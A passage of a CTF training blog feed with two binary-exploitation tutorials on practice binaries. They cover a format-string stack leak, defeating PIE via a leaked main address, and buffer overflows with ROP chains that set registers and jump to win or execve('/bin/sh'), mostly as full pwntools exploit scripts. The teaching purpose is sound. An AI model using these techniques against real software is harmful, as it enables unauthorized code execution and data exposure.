        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b* main
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span> <span class="c1">#make a connection to the flagleak binary
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># recv the line given by the binary
</span><span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>  <span class="o">+</span>  <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">print_flag</span><span class="sh">'</span><span class="p">])</span> <span class="p">)</span> <span class="c1"># send a bufferoverflow to the binary to redirect code excecution to print_flag
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>If you note there, I have added a ret instruction inbetween the print_flag function and rbp. This is to ensure stack alignment issues dont happen.</p>

<p>Ok now set a break point right at the printf function in the print_flag function. To do that change the main to the address of printf in the gdbscript. Running your script in vim is very easy.</p>

<div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ESC<span class="p">,</span> <span class="p">:</span><span class="k">w</span> <span class="p">|</span> <span class="p">!.</span>/% GDB NOASLR
</code></pre></div></div>
<p>In the above command we are writing the script with w, running a bash command with ! and excecuting the file ./%. % -&gt; represents the current file. GDB NOASLR -&gt; attachs gdb with ASLR disabled.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x401016</span><span class="p">)</span>  <span class="o">+</span>  <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">print_flag</span><span class="sh">'</span><span class="p">])</span> <span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>After playing a little bit with gdb and format strings you will know that most of the stuff thats leaked is from the stack. Now you can also inspect the stack in gdb pwndbg with <code class="language-plaintext highlighter-rouge">stack 20</code>. Wait a minute!! Do you see there is an address in stack that contains all the contents of our flag file ? Yes when you read and store a file, its contents will be stored on the stack.</p>

<p><img src="/assets/images/pwntraining2/pwntrain5.png" alt="" /></p>

<p>Also in the leaked values we can see that our flag address is also leaked.</p>

<p><img src="/assets/images/pwntraining2/pwntrain6.png" alt="" /></p>

<p>Now if you came this far you might have come across the format specifier %s -&gt; this will get the contents stored in an address. So what if instead of printing the address, lets print the string pointed by the address. (So should we change all the p to s ?). hmm You do it only if all the values on the stack are valid address that points to some string. In this case its better to just count which offset our string is and then print it.</p>

<p>Counting the offset we see that our string is in 12th position. So we can just print that position with a trick. <code class="language-plaintext highlighter-rouge">%{offset}$p</code> will print the the value in stack at that offset. So lets try it.</p>

<p><img src="/assets/images/pwntraining2/pwntrain7.png" alt="" /></p>

<p>YAY we managed to print it out, now finally we just have to print the contents of the address so change the p to s now. We managed to print something on the stack. (well done)</p>

<p><img src="/assets/images/pwntraining2/pwntrain8.png" alt="" /></p>

<h3 id="challenge-2">Challenge 2:</h3>

<p>Lets take this one step further and make the an exploit for another harder* binary.</p>

<p><a href="/assets/images/pwntraining2/ret2win_pie">vuln binary</a> and 
<a href="/assets/images/pwntraining2/ret2win_pie.c">vuln c code</a></p>

<h4 id="mitigations-1">Mitigations:</h4>

<p><img src="/assets/images/pwntraining2/pwntrain9.png" alt="" /></p>

<p>Exactly the same mitigations except PIE.
PIE ENABLED: this time we cant jump directly to another piece of code. The base address of binary will be randomised.
Go ahead and give this a try.</p>

<h4 id="code-walkthrough-1">Code walkthrough:</h4>

<p><img src="/assets/images/pwntraining2/pwntrain10.png" alt="" /></p>

<p>In the main function we can see that a buffer variable <code class="language-plaintext highlighter-rouge">shot</code> is initialised and it is being used to get an input and later printed on to the screen. After that a gets function is used. We already know that gets function does not care about the size of the buffer, it will read until a newline. lets spam so %p in the <code class="language-plaintext highlighter-rouge">shot</code> variable and see what out put we are getting.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Do you see a lot of garbage ? Along with that do you see some amazing addresses ?</p>

<p><img src="/assets/images/pwntraining2/pwntrain11.png" alt="" /></p>

<p>Exactly, the address <code class="language-plaintext highlighter-rouge">0x0000555555555222</code> is the start of main. So we have overcome the problem of PIE, since we know a address in the binary, we can calculate the relative offsets of other functions as well. Lets see what helper function we are provided with now.</p>

<h4 id="rop">ROP:</h4>

<p><img src="/assets/images/pwntraining2/pwntrain12.png" alt="" /></p>

<p>A win function: this will call execve(“/bin/sh”), its a ROP challenge and I am pretty sure you know how to do it. There is a small catch here. We have to calculate the relative offset of the addresses since PIE is enabled, so manually calculate the distance of the gadgets and the win function.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">27</span><span class="p">))</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()</span>

<span class="n">leaked_main</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">win_func</span> <span class="o">=</span> <span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x5555555551c8</span><span class="p">)</span>
<span class="n">binary_start</span> <span class="o">=</span> <span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x555555554000</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Leaked main address: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">win function: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">win_func</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Binary Start: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x555555554000</span><span class="p">)))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Here, I found out that the 27th position, the address of main is printed so I put all the leaked stuff into a list (You can just strip it and store the main address value too). Next I manaually subtract the offset and add it to get the address from the leaked value. Also just to be sure everything is correct, I log all the info I get and verify them in gdb.</p>

<p>Now its simple, just call the win function with its argument set to <code class="language-plaintext highlighter-rouge">0xdeadbeefcafebabe</code> (RDI).</p>

<p>Full Exploit:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./ret2win_pie</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2win_pie</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b* main+67
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">%p </span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">27</span><span class="p">))</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">()</span>

<span class="n">leaked_main</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">win_func</span> <span class="o">=</span> <span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x5555555551c8</span><span class="p">)</span>
<span class="n">binary_start</span> <span class="o">=</span> <span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x555555554000</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Leaked main address: </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">win function: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">win_func</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Binary Start: </span><span class="sh">"</span><span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">leaked_main</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x555555555222</span><span class="o">-</span><span class="mh">0x555555554000</span><span class="p">)))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binary_start</span><span class="o">+</span><span class="mh">0x00000000000012eb</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefcafebabe</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">win_func</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>     
</code></pre></div></div>

<p>Hope you guys enjoyed the pwn training 2 more amazing challenges are yet to come !! Happy hacking.</p>]]></content><author><name>tourpran</name></author><category term="pwn-training" /><category term="format strings" /><category term="printf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[pwn 1] Return to Shellcode</title><link href="http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1.html" rel="alternate" type="text/html" title="[pwn 1] Return to Shellcode" /><published>2021-05-09T00:00:00+05:30</published><updated>2021-05-09T00:00:00+05:30</updated><id>http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1</id><content type="html" xml:base="http://localhost:4000/pwn-training/2021/05/09/simple-ret2shellcode-training1.html"><![CDATA[<p><img src="/assets/images/pwntraining1/pwntrain20.png" alt="" /></p>

<h3 id="introduction">Introduction:</h3>

<p>This is an initiative taken by team members of <a href="https://ctftime.org/team/128734">ARESx</a>. In this series of <strong>pwn-training</strong> we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will go in a slow paced fashion covering most of the small details, so anyone can follow along this wonderful course.</p>

<h3 id="binary-exploitation">Binary Exploitation:</h3>
<p>Any file that does some function/ work is called a binary. Breaking down the word, binary exploitation itself, gives the meaning. We try different ways to break/exploit a program(Binary). This has become a common category in games called CTFs.</p>

<h3 id="challenge">Challenge:</h3>

<p>Here we are given a binary and the source code as part of the challenge. Usually the programmer writes in high level languages (human understandable language). Then that is compiled into a machine understandable form - binary. Our job as a exploit dev, need to figure out what this binary does and find the bug to exploit this program.</p>

<p><a href="/assets/images/pwntraining1/ret2shellcode">vuln binary</a> and 
<a href="/assets/images/pwntraining1/ret2shellcode.c">vuln c code</a></p>

<p>Play around with both the files a bit and continue reading this blog.</p>

<h3 id="prerequisites">Prerequisites:</h3>
<ul>
  <li>General understanding of linux.</li>
  <li>Curiosity to learn more by googling. (This is a must)</li>
</ul>

<h3 id="solution">Solution:</h3>

<h4 id="general-procedure">General Procedure:</h4>

<p>Before stepping in further into the solution, a common set of procedure when followed will make your job easier. Usually when you get a binary,</p>
<ul>
  <li>Check the mitigations (check for all permissions, security restrictions) of the binary.</li>
  <li>Run the binary and get a feel of what it is doing.</li>
  <li>Try to debug the assembly code of main in a disassembler or debugger. (IDA/ GDB/ Hopper).</li>
  <li>Note down observations and proceed to write the exploit script.</li>
</ul>

<h4 id="concept-of-buffer-overflow">Concept of buffer overflow:</h4>

<p>When we can write more than what we are supposed to write into a memory we call it a buffer overflow. Buffer overflows are common bugs when getting started in pwn. <strong>Gets</strong> is a vulnerable function that has a buffer overflow bug in it. It reads in more data than what the original array/ variable can handle. Multiple attacks will be discussed further on.</p>

<p><img src="/assets/images/pwntraining1/bufferoverflow.png" alt="" /></p>

<h4 id="stack">Stack</h4>

<p>A Stack is a memory segment, ment for storing data when a program is excecuted. This is a temporary storage unit. All the local variables created are stored here.</p>

<h4 id="registers">Registers:</h4>

<p>Registers are small data holding units. Think of it as variables used by the processor. Each register has its own unique job. 
<img src="/assets/images/pwntraining1/registers.png" alt="" />
<em>source:wikipedia</em></p>

<h4 id="mitigations">Mitigations:</h4>

<p>Before going into the exploitation, its better to check what mitigations are enabled for a binary. Mitigations are protections that were included to avoid certain attacks. We use the command <em>checksec</em> to see the basic mitigations in a binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./ret2shellcode
</code></pre></div></div>

<p><img src="/assets/images/pwntraining1/pwntrain1.png" alt="" /></p>

<p>If you don’t have checksec installed then, open up a terminal and type the below command to install the checksec program.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
</code></pre></div></div>

<p><strong>CANARY:</strong></p>
<ul>
  <li>Its a set of characters stored on the stack to make sure no buffer overflows takes place.</li>
</ul>

<p><strong>No eXecute:</strong></p>
<ul>
  <li>NX Enabled - This makes sure that the code on the stack is not excecuted.</li>
  <li>NX Disabled - Yea you guessed it, the code on the stack can be excecuted.</li>
</ul>

<p><strong>PIE:</strong></p>
<ul>
  <li>Position Independent Excecutable: This mitigation will randomise the address of the code and PLT in the virtual memory each time the program gets excecuted.</li>
</ul>

<p><strong>RWX:</strong></p>
<ul>
  <li>Read, write and execute : It’ll tell us if the binary has segments(parts) that we can read, write and excecute.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>If you are a curious assembly code lover, make sure to head over to the gdb (GNU debugger) and dig deep. Here I’ll go through the c code since its a basic writeup. In most scenarios you are not given the source code as it makes the task much easier. try to get comfy with assembly. <em>Or just use a disassembler lmao</em>.</p>

<p><img src="/assets/images/pwntraining1/pwntrain2.png" alt="" /></p>

<p>Just ignore the <em>ignore_me()</em> function its for standard buffering and stuff. There are 2 functions called <strong>win</strong> and <strong>main</strong>.</p>

<h4 id="main">main:</h4>
<p>Looking at <strong>main</strong> function, we see there is a <strong>buf</strong> variable with size 0x60 and a <strong>puts</strong> call. There is also a <strong>printf</strong> that will leak the address of the buf variable. %p is the address pointing to something, with little bit of searching you will know, its the address of buf variable.</p>

<p>There is another function called gets(). We know its a dangerous function. lets see why.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man gets
</code></pre></div></div>
<p><img src="/assets/images/pwntraining1/pwntrain3.png" alt="" /></p>

<p>Seems like gets will take input <ins>as long as there is a newline</ins> character which means we can get past the buf variable and mess things in the <strong>stack</strong>.</p>

<p><strong>GDB</strong> is a debugger that will break down the program into its assembly code. It makes things easier for a reverse engineer to know what a program does. I have a different version/flavour of gdb called pwndbg. <a href="https://github.com/pwndbg/pwndbg">link to download</a></p>

<pre><code class="language-gdb">disass main
</code></pre>
<p><img src="/assets/images/pwntraining1/pwntrain4.png" alt="" /></p>

<p>Ok, This is the main function that we saw earlier. Here a <strong>stack frame</strong> is created with the command <code class="language-plaintext highlighter-rouge">push rbp; mov rbp,rsp</code> . In a stack for every new function a new stack frame is created to store the local variables required in that particular function. So when a function exits the stack frame also gets deleted. <em>le memory efficiency</em>.</p>

<p>Point to note, The arguments to the function are passed via registers. RDI, RSI, RDX registers are used to store the first, second, third argument to a function.</p>

<ul>
  <li>Here we see that the 3 arguments are set in the respective registers.</li>
  <li>Puts function is called with what is in the RDI register.</li>
  <li>We can also see a printf function which is called with RDI set to RIP+0xe29, which is the start of our buffer. Here RIP refers to the instruction pointer.</li>
  <li>Finally a gets is also called, which is exploited in our case.</li>
</ul>

<p>Now, we will set a break point in GDB to stop at a particular location that we specify during the runtime. By doing this, at a specific instruction we can know what the registers are holding and what changes are made at that point of time in the excecution.</p>

<p>To set a breakpoint <strong>b * address of the instruction</strong>, in this case set a break point at ret instruction in main.</p>

<pre><code class="language-gdb">b* 0x0000000000401238
</code></pre>

<p>Take some time of your own, play around with the binary and see if you can crash the binary in some way.</p>

<p>Great if you got a <strong>segfault</strong> else no worries. Well do it together. Run the binary in gdb with <code class="language-plaintext highlighter-rouge">r</code> and then give 0x60 “a”s, this will fill up the buf variable with all that garbage. After those random “a”s maybe create an offset pattern like <strong>111111112222222233333333</strong>. So incase the binary crashes we can see exactly where it crashed.</p>

<blockquote>
  <p>Segfault - It is caused because our program is trying to read a part of memory thats invalid</p>
</blockquote>

<p>In our case we overflowed the buf variable with “a”s and filling the RBP with <strong>11111111</strong> and finally making the return address point to <strong>22222222</strong>, Since there is no <strong>22222222</strong> address in memory, we will get a segfault. Whenever a program tries to jump to an address that is not there you will recieve a segfault error.</p>

<p><img src="/assets/images/pwntraining1/pwntrain5.jpg" alt="" /></p>

<p>You can see all the values set in the registers like <code class="language-plaintext highlighter-rouge">RAX</code>, <code class="language-plaintext highlighter-rouge">RBX</code>, <code class="language-plaintext highlighter-rouge">RCX</code>. To our intrest we need the <code class="language-plaintext highlighter-rouge">RSP</code>.
The RSP is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.</p>

<h4 id="aim">Aim:</h4>

<p>As an attacker our aim is to make this binary give a <strong>shell</strong> for us in the server. A shell is a way of getting complete access on whatever target we are attacking. In future blogs, you might also see that you wont have the root (admin) access in a shell. You have to do several privilage escalations to make yourself root, though all of those fun stuff are for another time.</p>

<p>So we looked at a win() function earlier, this will land us a nice neat shell!
Though there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.</p>

<h4 id="return-to-win">Return to win:</h4>

<p>Now since we control the return address of main function, why not lets change the return address to win function?</p>
<ul>
  <li>Win function does <strong>execve(“/bin/sh”)</strong> -&gt; which means that it’ll call a <strong>system</strong> function called <strong>execve</strong> and excecute the command <code class="language-plaintext highlighter-rouge">/bin/sh</code> which is a shell.</li>
</ul>

<p>ok lets start writing our script in python. First we will <code class="language-plaintext highlighter-rouge">import pwntools</code> library to make things easier. Next we will connect to our binary and send/recieve messages.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># Importing the library called pwntools
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># create a instance/process with the binary. helps to interact with the program. 
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span> <span class="c1"># Send the payload(attack input) to the program.
</span><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="c1">#If we get a shell make it interactive.
</span></code></pre></div></div>

<p>Here in the sendline command I am giving “a” * 0x60 to fill the buf variable and extra “a” * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ?</p>
<blockquote>
  <p>p64() function will make your address into little endian format. To know more about <a href="https://www.geeksforgeeks.org/little-and-big-endian-mystery/">formats</a></p>
</blockquote>

<p>Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?</p>

<p><img src="/assets/images/pwntraining1/pwntrain6.png" alt="" /></p>

<p>You can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the <code class="language-plaintext highlighter-rouge">execve</code>.</p>

<p><img src="/assets/images/pwntraining1/pwntrain7.png" alt="" /></p>

<p>So we have to somehow make the <code class="language-plaintext highlighter-rouge">arg1 = 0xdeadbeef</code> and <code class="language-plaintext highlighter-rouge">arg2 = 0xcafebabe</code>. This is where return oriented programming comes into picture.</p>

<h4 id="return-oriented-programming">Return Oriented Programming:</h4>

<p>This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that’ll do something valuable to us.</p>

<ul>
  <li>Since win is a function with arg1 and arg2 as parameters. We can set RDI = 0xdeadbeef and RSI = 0xcafebabe. Then call win function.</li>
</ul>

<h4 id="exploit-ret2win">Exploit [ret2win]:</h4>

<p>Firstly we can get all the gadgets/code snippets in the binary with <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>. Then lets take out the ones that we want.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ROPgadget.py <span class="nt">--binary</span> ../Documents/pwn-train/pwn1/ret2shellcode
</code></pre></div></div>

<p><img src="/assets/images/pwntraining1/pwntrain8.png" alt="" /></p>

<p>We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x000000000040129b</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000000000401299</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/assets/images/pwntraining1/pwntrain9.png" alt="" /></p>

<h4 id="exploit-simpler-version">Exploit [simpler version]:</h4>

<p>I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">ret2shellcode</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011d1</span><span class="p">))</span> <span class="c1"># address to execve
</span><span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>
<blockquote>
  <p>Here we avoided the constraints and directly jumped to the execve funtion. Clever of you.</p>
</blockquote>

<h4 id="return-2-shellcode">return 2 shellcode:</h4>

